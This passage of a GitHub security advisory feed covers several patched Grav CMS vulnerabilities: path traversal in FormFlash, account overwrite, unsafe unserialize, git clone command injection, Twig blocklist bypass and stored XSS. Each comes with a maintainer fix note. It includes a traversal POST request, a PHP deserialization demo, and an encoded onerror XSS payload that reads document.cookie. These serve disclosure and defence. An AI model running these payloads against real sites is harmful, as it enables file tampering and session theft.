-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/SvgXxeSecurityTest.php"><code>tests/unit/Grav/Common/Security/SvgXxeSecurityTest.php</code></a> — XXE neutralization + billion-laughs + plain-SVG regression.</li>
-<li>dom-sanitizer: <a href="https://github.com/rhukster/dom-sanitizer/blob/main/src/DOMSanitizer.php"><code>src/DOMSanitizer.php</code></a> + two new XXE tests in its own suite.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-3446-6mgw-f79p">https://github.com/getgrav/grav/security/advisories/GHSA-3446-6mgw-f79p</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-3446-6mgw-f79p">https://github.com/advisories/GHSA-3446-6mgw-f79p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3446-6mgw-f79p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-05T21:35:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav has Unauthenticated Path Traversal & Arbitrary File Write in its FormFlash component]]></title>
-        <id>https://github.com/advisories/GHSA-hmcx-ch82-3fv2</id>
-        <link href="https://github.com/advisories/GHSA-hmcx-ch82-3fv2"/>
-        <updated>2026-05-05T21:34:58.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="vulnerability-report-grav-cms-unauthenticated-path-traversal--arbitrary-file-write">Vulnerability Report: Grav CMS Unauthenticated Path Traversal &amp; Arbitrary File Write</h1>
-<p><strong>[ZERO-DAY] Unauthenticated Path Traversal leading to Arbitrary Directory Creation and Configuration Injection</strong></p>
-<h2 id="summary">Summary</h2>
-<p>Grav CMS (v1.7.49.5 and latest development source) is vulnerable to a Zero-Day Path Traversal vulnerability within the FormFlash core component. By manipulating the session_id (passed as <code>__form-flash-id</code> in POST requests), an unauthenticated attacker can traverse the filesystem to create arbitrary directories and write an <code>index.yaml</code> file containing attacker-controlled data.</p>
-<p>This vulnerability can lead to unauthorized modification of application behavior, potential data integrity issues, and service disruption in production environments.</p>
-<h2 id="affected-component">Affected Component</h2>
-<ul>
-<li>Versions: Confirmed in Grav v1.7.49.5 (latest stable) and the latest development source (March 2026).</li>
-<li>Class: <code>Grav\Framework\Form\FormFlash</code></li>
-<li>Method: <code>__construct()</code> / <code>getTmpDir()</code></li>
-<li>Parameter: <code>session_id</code> (Mapped to <code>__form-flash-id</code> in POST requests)</li>
-</ul>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<p>The FormFlash class is used to persist form data across redirects. It constructs a temporary storage path using the provided session_id. The path construction logic in the latest source:</p>
-<pre><code class="language-php">$folder = $config['folder'] ?? ($this-&gt;sessionId ? 'tmp://forms/' . $this-&gt;sessionId : '');
-$this-&gt;folder = $folder &amp;&amp; $locator-&gt;isStream($folder) ? $locator-&gt;findResource($folder, true, true) : $folder;
-</code></pre>
-<p>Lack of sanitization on the sessionId (the raw session identifier) allows the use of <code>../</code> sequences. When <code>findResource</code> resolves the stream, it allows escape into any writable directory within the webserver's scope (typically <code>user/config/</code>, <code>cache/</code>, <code>logs/</code>, and <code>tmp/</code>).</p>
-<h2 id="affected-versions--zero-day-status">Affected Versions &amp; Zero-Day Status</h2>
-<ul>
-<li>Tested Version: v1.7.49.5 (Latest Stable Release as of Nov 2025).</li>
-<li>Development Branch Status: Vulnerable. The latest source code in the GitHub develop branch (March 2026) remains unpatched.</li>
-<li>Affected Range: All Grav CMS versions utilizing the FormFlash component (v1.7.x and potentially older v1.6.x versions).</li>
-<li>CVE Status: Zero-Day (Non-Registered). Extensive research confirmed no existing CVE addresses this specific core FormFlash session-based traversal.</li>
-</ul>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<ol>
-<li>Identify any page containing a Grav Form (e.g., <code>/contact</code>).</li>
-<li>Intercept the POST request during form submission.</li>
-<li>Modify the <code>__form-flash-id</code> parameter to include a traversal sequence targeting a writable directory (e.g., <code>../../user/config/proof_dir</code>).</li>
-<li>Submit the request.</li>
-<li>Observe that a new directory (<code>poc/</code>) and file (<code>index.yaml</code>) have been created at the traversed path.</li>
-</ol>
-<h2 id="request-example">Request Example</h2>
-<pre><code class="language-http">POST /contact HTTP/1.1
-Host: target.grav.cms
-Content-Type: application/x-www-form-urlencoded
-
-__form-name-=contact&amp;__form-flash-id=../../user/config/proof_dir&amp;form-data[name]=Attack&amp;form-data[message]=Payload
-</code></pre>
-<h2 id="response--result">Response / Result</h2>
-<ul>
-<li>HTTP/1.1 302 Found (Standard redirect)</li>
-<li>Filesystem Modification:<ul>
-<li>Directory Created: <code>/var/www/html/user/config/proof_dir/poc/</code></li>
-<li>File Created: <code>/var/www/html/user/config/proof_dir/poc/index.yaml</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="proof-of-concept-evidence-beforeafter">Proof of Concept Evidence (Before/After)</h2>
-<h3 id="before-exploitation">Before Exploitation</h3>
-<ul>
-<li>Status: Directory does not exist.</li>
-<li>Evidence:</li>
-</ul>
-<pre><code class="language-bash">$ ls -la /var/www/html/user/config/proof_dir/
-ls: cannot access '/var/www/html/user/config/proof_dir/': No such file or directory
-</code></pre>
-<h3 id="after-exploitation">After Exploitation</h3>
-<ul>
-<li>Status: Arbitrary directory and <code>index.yaml</code> created.</li>
-<li>Evidence:</li>
-</ul>
-<pre><code class="language-bash">$ ls -la /var/www/html/user/config/proof_dir/poc/index.yaml
--rw-rw-r-- 1 www-data www-data 158 Mar 23 22:15 /var/www/html/user/config/proof_dir/poc/index.yaml
-$ cat /var/www/html/user/config/proof_dir/poc/index.yaml
-form: ''
-id: ''
-unique_id: poc
-...
-data:
-  poc_status: confirmed
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Clarified Cross-User Attack: By controlling the session identifier, an attacker can overwrite or interfere with other users temporary form data, breaking session isolation.</li>
-<li>Configuration Injection: Writing <code>index.yaml</code> into plugin/theme configuration subdirectories can alter application behavior or inject malicious settings.</li>
-<li>Data Integrity: Unauthorized modification of configuration subfolders can lead to widespread site corruption or logical bypasses.</li>
-<li>Denial of Service (DoS): Recursive directory creation enables attackers to exhaust disk space or inodes (inode exhaustion).</li>
-</ul>
-<h2 id="attack-requirements">Attack Requirements</h2>
-<ul>
-<li>Authentication: None (Unauthenticated)</li>
-<li>Configuration: Standard Grav installation with at least one form-enabled page (e.g., Contact, Login, Registration)</li>
-</ul>
-<h2 id="exploitability-assessment">Exploitability Assessment</h2>
-<ul>
-<li>Complexity: Low. Requires only basic HTTP POST parameters.</li>
-<li>Reliability: 100% (Deterministically reproducible in vulnerable versions).</li>
-<li>Severity: Critical / High. The vulnerability requires no authentication and allows filesystem manipulation and session data corruption.</li>
-</ul>
-<h2 id="remediation">Remediation</h2>
-<ol>
-<li>Sanitize Session IDs: Apply <code>basename()</code> or a strict alphanumeric regex to the <code>session_id</code> in FormFlash before path construction.</li>
-<li>Filesystem Hardening: Ensure <code>user/config/</code> and other sensitive directories have restrictive permissions preventing the webserver from creating new subdirectories.</li>
-<li>Update Grav: Monitor for patches addressing FormFlash sanitization.</li>
-</ol>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/d904efc33"><code>d904efc33</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed:</strong> <code>FormFlash::__construct()</code> now sanitizes <code>session_id</code>, <code>unique_id</code>, and <code>id</code> through a strict <code>[A-Za-z0-9,_-]{1,64}</code> allowlist before any path is constructed from them. Invalid values collapse to <code>''</code>, which causes <code>save()</code>/<code>delete()</code>/<code>getTmpDir()</code> to no-op — so a <code>__form-flash-id=../../user/config/proof_dir</code> POST simply does nothing on disk.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Framework/Form/FormFlash.php"><code>system/src/Grav/Framework/Form/FormFlash.php</code></a></li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/FormFlashSecurityTest.php"><code>tests/unit/Grav/Common/Security/FormFlashSecurityTest.php</code></a> — 32 test cases covering the PoC + variants.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-hmcx-ch82-3fv2">https://github.com/getgrav/grav/security/advisories/GHSA-hmcx-ch82-3fv2</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47">https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/d904efc33e03ebb597afde8d3368b28cf0423632">https://github.com/getgrav/grav/commit/d904efc33e03ebb597afde8d3368b28cf0423632</a></li>
-<li><a href="https://github.com/advisories/GHSA-hmcx-ch82-3fv2">https://github.com/advisories/GHSA-hmcx-ch82-3fv2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hmcx-ch82-3fv2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:34:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to Administrative Account Disruption and Privilege De-escalation via User Overwrite Logic]]></title>
-        <id>https://github.com/advisories/GHSA-rr73-568v-28f8</id>
-        <link href="https://github.com/advisories/GHSA-rr73-568v-28f8"/>
-        <updated>2026-05-05T21:29:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A business logic vulnerability in the Grav Admin Panel allows a low-privileged user (with only user creation permissions) to overwrite existing accounts, including the primary administrator. By creating a new user with a username that already exists, the system updates the existing account's metadata and permissions instead of rejecting the request. This leads to a Denial of Service (DoS) on administrative functions and Privilege De-escalation of the root account.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability stems from an insecure "Create or Update" logic within the user management module. When the admin-addon handles a user creation request, it does not strictly validate whether the username is already taken by a higher-privileged account. Instead of returning a "409 Conflict" or a validation error, the application logic proceeds to overwrite the existing user configuration file (e.g., user/accounts/root0.yaml) with the new, lower-privileged data provided by the attacker.
-Because the attacker cannot assign higher permissions to themselves (due to existing fixes), the result is that the targeted account (the original Admin/Root) has its access levels wiped or replaced by the attacker's input, effectively locking the real administrator out of the system.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Log in as a Super User (e.g., root0) and create a low-privileged user (e.g., adminuser).</li>
-<li>Assign adminuser the following specific permissions:
-admin.login
-admin.users.list
-admin.users.read
-admin.users.create</li>
-<li>Log out and log back in as adminuser.</li>
-<li>Navigate to User Accounts -&gt; Add.</li>
-<li>Fill in the form with the following details:
-Username: root0 (The exact username of the Super User)
-Email: <code>anything@grav.f</code>
-Fullname: Fake Root0</li>
-<li>Click Save.</li>
-<li>Observe that the account is successfully "created".</li>
-<li>The original administrative permissions are gone, and the account is now restricted.</li>
-</ol>
-<h4 id="poc-video">PoC video</h4>
-<p><a href="https://github.com/user-attachments/assets/047cb44e-0279-402b-b4fb-12bf5d427a5e">https://github.com/user-attachments/assets/047cb44e-0279-402b-b4fb-12bf5d427a5e</a></p>
-<h3 id="impact">Impact</h3>
-<p>This is a Privilege De-escalation and Account Disruption vulnerability.
-Who is impacted: Any Grav installation where a non-admin user is granted permission to create other users.
-Consequence: An attacker can effectively disable all administrative accounts on the platform, leading to a complete loss of management control over the CMS.</p>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/d904efc33"><code>d904efc33</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed:</strong> <code>UserObject::save</code> already had a uniqueness guard (commit <a href="https://github.com/getgrav/grav/commit/19c2f8da7"><code>19c2f8da7</code></a>, November 2025) that blocks the PoC. This release tightens that guard:</p>
-<ol>
-<li><code>strpos($key, '@@')</code> → <code>str_contains($key, '@@')</code>. The previous form was falsy when the transient-key marker was at position 0 (e.g. <code>@@hash</code>), silently bypassing the check. <code>str_contains</code> returns a proper boolean.</li>
-<li>The <code>instanceof FileStorage</code> gate was dropped so the uniqueness check runs for any <code>FlexStorageInterface</code> backend — not just the default file-per-user YAML one.</li>
-</ol>
-<p>A low-privileged user with <code>admin.users.create</code> can no longer disrupt a super-admin account by submitting that admin's username through the "add user" form.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Flex/Types/Users/UserObject.php"><code>system/src/Grav/Common/Flex/Types/Users/UserObject.php</code></a>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/UserOverwriteSecurityTest.php"><code>tests/unit/Grav/Common/Security/UserOverwriteSecurityTest.php</code></a> — 3 tests pinning the PoC, the <code>@@</code>-prefix edge case, and pass-through for free usernames.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-rr73-568v-28f8">https://github.com/getgrav/grav/security/advisories/GHSA-rr73-568v-28f8</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47">https://github.com/getgrav/grav/commit/c66dfeb5ff679a1667678c6335eb9ff3255dfc47</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/d904efc33e03ebb597afde8d3368b28cf0423632">https://github.com/getgrav/grav/commit/d904efc33e03ebb597afde8d3368b28cf0423632</a></li>
-<li><a href="https://github.com/advisories/GHSA-rr73-568v-28f8">https://github.com/advisories/GHSA-rr73-568v-28f8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rr73-568v-28f8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:29:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav has Insecure Deserialization in File Cache]]></title>
-        <id>https://github.com/advisories/GHSA-gwfr-jfjf-92vv</id>
-        <link href="https://github.com/advisories/GHSA-gwfr-jfjf-92vv"/>
-        <updated>2026-05-05T21:29:30.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="insecure-deserialization-in-file-cache">Insecure Deserialization in File Cache</h1>
-<ul>
-<li><strong>Severity:</strong> High </li>
-<li><strong>CWE:</strong> CWE-502</li>
-<li><strong>Location:</strong> <code>system/src/Grav/Framework/Cache/Adapter/FileCache.php</code></li>
-<li><strong>Sink:</strong> <code>unserialize($value, ['allowed_classes' =&gt; true])</code></li>
-</ul>
-<h2 id="affected-versions">Affected version(s)</h2>
-<ul>
-<li><strong>Affected:</strong> <code>&gt;= 1.7.44</code> and <code>&lt;= 1.7.49.5</code> (verified in current codebase and changelog-covered releases).</li>
-<li><strong>Fixed:</strong> No upstream fix identified in the reviewed branch at the time of analysis.</li>
-<li><strong>Notes:</strong> Earlier <code>1.7.x</code> releases may also be affected, but were not fully back-traced in this review.</li>
-</ul>
-<h2 id="notes">Notes</h2>
-<p><code>allowed_classes =&gt; true</code> allows object instantiation and does not constrain classes.</p>
-<h2 id="poc-primitive-demonstration">PoC (Primitive Demonstration)</h2>
-<h3 id="preconditions">Preconditions</h3>
-<ul>
-<li>Local PHP runtime.</li>
-<li>Goal is to validate the deserialization primitive used in cache retrieval.</li>
-</ul>
-<h3 id="steps">Steps</h3>
-<pre><code class="language-bash">php -r '
-class CacheWakeup { public function __wakeup(){ file_put_contents("/tmp/grav_filecache_poc.txt", "wakeup"); } }
-
-$payload = serialize(new CacheWakeup());
-unserialize($payload, ["allowed_classes" =&gt; true]);
-
-echo file_exists("/tmp/grav_filecache_poc.txt") ? "FILECACHE_UNSERIALIZE_TRIGGERED\n" : "FILECACHE_UNSERIALIZE_NOT_TRIGGERED\n";
-'
-</code></pre>
-<h3 id="expected-result">Expected Result</h3>
-<ul>
-<li>Output contains: <code>FILECACHE_UNSERIALIZE_TRIGGERED</code>.</li>
-</ul>
-<h3 id="interpretation">Interpretation</h3>
-<p>This reproduces the same unsafe primitive used by <code>FileCache::doGet()</code>:
-<code>unserialize($value, ['allowed_classes' =&gt; true])</code>.
-If cache files are attacker-tampered, object magic methods may execute.</p>
-<h2 id="exploit-preconditions">Exploit Preconditions</h2>
-<ul>
-<li>Cache file poisoning/tampering capability.</li>
-</ul>
-<h2 id="recommendation">Recommendation</h2>
-<ul>
-<li>Avoid object deserialization in cache payloads.</li>
-<li>Use non-object formats and integrity protection for cache files.</li>
-</ul>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/c66dfeb5f"><code>c66dfeb5f</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
-<p><strong>What changed:</strong> <code>Framework\Cache\Adapter\FileCache</code> now HMAC-signs every cache payload with <code>Security::getNonceKey()</code> on write, and verifies the HMAC on read. Tampered, forged, or pre-upgrade files are treated as cache misses and unlinked instead of being unserialized. The on-disk format is now versioned:</p>
-<pre><code>v2
-&lt;expires&gt;
-&lt;key&gt;
-&lt;hmac-hex&gt;
-&lt;serialized&gt;
-</code></pre>
-<p>Existing caches rebuild transparently on first read. Note that <code>Framework\Cache\Adapter\FileCache</code> isn't wired into Grav's main cache path — Symfony's <code>FilesystemAdapter</code> is — but the class is reachable by plugin and downstream consumers, so the hardening applies defensively.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Framework/Cache/Adapter/FileCache.php"><code>system/src/Grav/Framework/Cache/Adapter/FileCache.php</code></a>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/FileCacheSecurityTest.php"><code>tests/unit/Grav/Common/Security/FileCacheSecurityTest.php</code></a> — round-trip, tampered-payload rejection, wrong-key forgery rejection, pre-v2 file rebuild, key-field mismatch.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-gwfr-jfjf-92vv">https://github.com/getgrav/grav/security/advisories/GHSA-gwfr-jfjf-92vv</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-gwfr-jfjf-92vv">https://github.com/advisories/GHSA-gwfr-jfjf-92vv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gwfr-jfjf-92vv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T21:29:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav has multiple RCE vectors: unsafe unserialize (x3), command injection in git clone, SSTI blocklist bypass]]></title>
-        <id>https://github.com/advisories/GHSA-vj3m-2g9h-vm4p</id>
-        <link href="https://github.com/advisories/GHSA-vj3m-2g9h-vm4p"/>
-        <updated>2026-05-05T21:29:03.000Z</updated>
-        <content type="html"><![CDATA[<p>Multiple RCE vectors were found in Grav CMS. Three are critical, two are high.</p>
-<p><strong>1. Unsafe unserialize() in JobQueue — direct RCE gadget (Critical)</strong></p>
-<p><code>system/src/Grav/Common/Scheduler/JobQueue.php:465</code> calls <code>unserialize(base64_decode(...))</code> without restricting <code>allowed_classes</code>. The <code>Job</code> class has <code>call_user_func_array($this-&gt;command, $this-&gt;args)</code> in its execution path, which is a direct gadget chain — inject a serialized <code>Job</code> with <code>command = 'system'</code> and <code>args = ['whoami']</code>.</p>
-<p>The same codebase actually has a <code>Serializable</code> trait that correctly restricts classes, so this inconsistency stands out.</p>
-<p><strong>2. Unsafe unserialize() in FileCache — arbitrary class instantiation (Critical)</strong></p>
-<p><code>system/src/Grav/Framework/Cache/Adapter/FileCache.php:75</code> does <code>unserialize($value, ['allowed_classes' =&gt; true])</code>. That <code>true</code> allows instantiation of any class. If an attacker can write to the cache directory (via any file write primitive), they get object injection → RCE.</p>
-<p><strong>3. Unsafe unserialize() in Session (High)</strong></p>
-<p><code>system/src/Grav/Common/Session.php:116</code> — same <code>allowed_classes =&gt; true</code> pattern on session data. Lower severity since session storage is typically more restricted.</p>
-<p><strong>4. Command injection in git clone (Critical)</strong></p>
-<p><code>system/src/Grav/Console/Cli/InstallCommand.php:150</code> — only <code>$this-&gt;destination</code> uses <code>escapeshellarg()</code>. The <code>$data['branch']</code>, <code>$data['url']</code>, and <code>$data['path']</code> variables go directly into the shell command without escaping. Admin-accessible via plugin/theme installation.</p>
-<p><strong>5. SSTI blocklist bypass (High)</strong></p>
-<p><code>system/src/Grav/Common/Security.php:267-286</code> — <code>cleanDangerousTwig()</code> blocks <code>twig_array_map</code> and <code>twig_array_filter</code> but not <code>twig_array_reduce</code>. Also missing <code>file_get_contents</code> and <code>fwrite</code> from the dangerous function blocklist. An attacker who can inject Twig templates can bypass the security filter.</p>
-<p>All five are independently exploitable. The unserialize issues are the most concerning since they don't require admin access if there's any file write primitive.</p>
-<p>— ProScan AppSec | proscan.one</p>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/c66dfeb5f"><code>c66dfeb5f</code></a> (items #1, #2, #3, #4) and commit <a href="https://github.com/getgrav/grav/commit/38685ac25"><code>38685ac25</code></a> + <a href="https://github.com/getgrav/grav/commit/c66dfeb5f"><code>c66dfeb5f</code></a> (item #5) — ships in <strong>2.0.0-beta.2</strong>.</p>
-<p>All five vectors addressed:</p>
-<ol>
-<li><p><strong>Scheduler\JobQueue unsafe unserialize</strong> — <code>serialized_job</code> now carries a sibling <code>serialized_job_hmac</code> signed with <code>Security::getNonceKey()</code>. <code>reconstructJob</code> refuses to unserialize an item whose HMAC is missing/mismatched and falls through to the safe structured-fields rebuild. A tampered queue file can no longer smuggle a forged <code>Job</code> for direct RCE via <code>Job::exec → call_user_func_array</code>.<br>→ <a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Scheduler/JobQueue.php"><code>system/src/Grav/Common/Scheduler/JobQueue.php</code></a></p>
-</li>
-<li><p><strong>FileCache unsafe unserialize</strong> — same HMAC-integrity approach; see separate GHSA-gwfr-jfjf-92vv.<br>→ <a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Framework/Cache/Adapter/FileCache.php"><code>system/src/Grav/Framework/Cache/Adapter/FileCache.php</code></a></p>
-</li>
-<li><p><strong>Session::getFlashObject unsafe unserialize</strong> — payload now wrapped in a <code>v2|&lt;hmac&gt;|&lt;serialized&gt;</code> envelope; legacy/forged envelopes return null instead of triggering <code>unserialize</code>.<br>→ <a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Session.php"><code>system/src/Grav/Common/Session.php</code></a></p>
-</li>
-<li><p><strong>InstallCommand <code>git clone</code> shell injection</strong> — <code>branch</code>, <code>url</code>, and <code>path</code> values read from <code>user/.dependencies</code> are now passed through <code>escapeshellarg</code>, with a <code>--</code> separator before url/path to block option-injection (e.g. <code>--upload-pack=evil</code>).<br>→ <a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Console/Cli/InstallCommand.php"><code>system/src/Grav/Console/Cli/InstallCommand.php</code></a></p>
-</li>
-<li><p><strong>SSTI blocklist bypass</strong> — <code>twig_array_reduce</code> (the specific name called out) plus <code>twig_array_some</code> and <code>twig_array_every</code> added to <code>cleanDangerousTwig</code>'s <code>CALLABLE_DANGEROUS_NAMES</code> alongside the existing <code>twig_array_map</code>/<code>filter</code>. More importantly, the new Twig content sandbox in 2.0.0-beta.2 blocks this class of attack at a different layer — see the sandbox work in <a href="https://github.com/getgrav/grav/commit/38685ac25"><code>38685ac25</code></a>.<br>→ <a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Security.php"><code>system/src/Grav/Common/Security.php</code></a></p>
-</li>
-</ol>
-<p><strong>Tests:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/UnserializeIntegritySecurityTest.php"><code>tests/unit/Grav/Common/Security/UnserializeIntegritySecurityTest.php</code></a> — 8 cases covering JobQueue + Session HMAC integrity.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/FileCacheSecurityTest.php"><code>tests/unit/Grav/Common/Security/FileCacheSecurityTest.php</code></a>.</li>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/tests/unit/Grav/Common/Security/CleanDangerousTwigTest.php"><code>tests/unit/Grav/Common/Security/CleanDangerousTwigTest.php</code></a> — new <code>twig_array_*</code> entries in <code>providerCallbackFunctions</code>.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-vj3m-2g9h-vm4p">https://github.com/getgrav/grav/security/advisories/GHSA-vj3m-2g9h-vm4p</a></li>
-<li><a href="https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663">https://github.com/getgrav/grav/commit/5a12f9be8314682c8713e569e330f11805d0a663</a></li>
-<li><a href="https://github.com/advisories/GHSA-vj3m-2g9h-vm4p">https://github.com/advisories/GHSA-vj3m-2g9h-vm4p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vj3m-2g9h-vm4p</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T21:29:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav Vulnerable to Publisher-Level Stored XSS via Unquoted Event Attributes]]></title>
-        <id>https://github.com/advisories/GHSA-9695-8fr9-hw5q</id>
-        <link href="https://github.com/advisories/GHSA-9695-8fr9-hw5q"/>
-        <updated>2026-05-05T21:27:16.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A stored Cross-Site Scripting (XSS) vulnerability in <code>getgrav/grav</code> allows publisher-level accounts to execute arbitrary JavaScript. The issue arises from a blacklist bypass in the <code>detectXss()</code> function when handling unquoted HTML event attributes.</p>
-<h3 id="details">Details</h3>
-<p>The <code>detectXss()</code> function relies on a blacklist pattern to filter malicious attributes. The specific regex pattern used to match <code>on*</code> events is flawed:</p>
-<pre><code class="language-php">'on_events' =&gt; '#(&lt;[^&gt;]+[a-z\x00-\x20\"\'\/])(on[a-z]+|xmlns)\s*=[\s|\'\"].*[\s|\'\"]&gt;#iUu'
-</code></pre>
-<p>This pattern fails to properly identify <code>on*</code> event handlers that are constructed without quotation marks. This allows an attacker to completely bypass the filter. <em>Note: It is highly recommended to replace this blacklist approach with a robust, established HTML sanitization library.</em></p>
-<h3 id="poc">PoC</h3>
-<p>An attacker with publisher-level access can reproduce this by injecting the following payload into any vulnerable content field:</p>
-<pre><code class="language-html">&lt;img src=x onerror=eval(atob(/YWxlcnQoZG9jdW1lbnQuY29va2llKQ/.source))&gt;
-</code></pre>
-<img src="https://github.com/user-attachments/assets/0f1a339b-25a8-4b6e-91af-8c59e6a39297" alt="image1" height="482" width="1889">
-<img src="https://github.com/user-attachments/assets/12680058-bbb3-4446-b58e-515533bb4e90" alt="image2" height="920" width="3055">
-<img src="https://github.com/user-attachments/assets/c7ed7e61-8dcf-402d-8589-98d18978c71a" alt="image3" height="1339" width="2909">
-
-
-<p><strong>Execution Details:</strong>
-The <code>onerror</code> event is written without quotes to bypass the regex. Because unquoted attributes are restricted in their character usage (e.g., the <code>=</code> symbol cannot be used easily), the payload leverages <code>atob()</code> and regex <code>.source</code> to decode the base64 string <code>YWxlcnQoZG9jdW1lbnQuY29va2llKQ</code> (which translates to <code>alert(document.cookie)</code>). The <code>atob()</code> function conveniently auto-completes the necessary <code>=</code> padding for the base64 string.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Vulnerability Type:</strong> Stored Cross-Site Scripting (XSS)</li>
-<li><strong>Impacted Parties:</strong> Any user (including administrators) who views the compromised content published by the attacker.</li>
-<li><strong>Consequences:</strong> Attackers can execute malicious scripts in a victim's browser, leading to session hijacking (cookie theft), unauthorized actions.</li>
-</ul>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed in Grav core on the <code>2.0</code> branch: commit <a href="https://github.com/getgrav/grav/commit/5a12f9be8"><code>5a12f9be8</code></a> — will ship in <strong>2.0.0-beta.2</strong>.</p>
